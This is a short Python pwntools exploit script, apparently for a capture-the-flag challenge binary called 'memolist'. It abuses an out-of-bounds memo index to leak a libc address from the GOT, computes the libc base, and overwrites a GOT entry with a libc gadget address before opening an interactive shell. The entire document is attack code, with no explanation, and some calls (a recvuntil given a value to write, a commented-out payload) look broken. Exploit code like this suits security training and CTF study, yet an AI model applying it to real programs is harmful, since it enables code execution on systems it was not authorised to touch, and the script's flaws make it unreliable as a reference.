#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./memolist')
pause()

libc_start_main_offset = 0x21ab0

libc_start_main_got = 0x600ff0
puts_got = 0x601018
memo = 0x601080

p.sendafter('choice:', "1")
p.sendafter('Index:', str((libc_start_main_got - memo)/8))

p.recvuntil('Here\'s your memo: ')


libc = u64(p.recv(6) + '\0\0') - libc_start_main_offset

success(libc + 0x4f440)

p.sendafter('choice:', "2")
p.sendafter('Index:', str((0x601038 - memo)/8))

p.recvuntil('What do you want to write?', str(libc + 0x4f440))

# payload = flat(
#     # cyclic(0x8),
#     # system.address
# )

# p.sendafter(':', payload)

p.interactive()
p.close()
